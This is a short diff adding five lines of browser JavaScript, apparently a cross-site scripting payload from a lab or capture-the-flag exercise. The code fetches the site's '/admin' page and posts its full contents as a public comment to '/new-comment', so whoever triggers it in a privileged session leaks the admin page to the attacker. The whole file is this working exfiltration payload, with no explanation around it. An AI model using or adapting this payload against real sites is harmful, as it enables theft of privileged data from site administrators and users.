@@ -1,0 +1,5 @@
+const admin = await (await fetch("/admin")).text();
+const test = new URLSearchParams();
+test.set("name","Name1123");
+test.set("comment",admin);
+fetch("/new-comment",{method:"post", body:test});
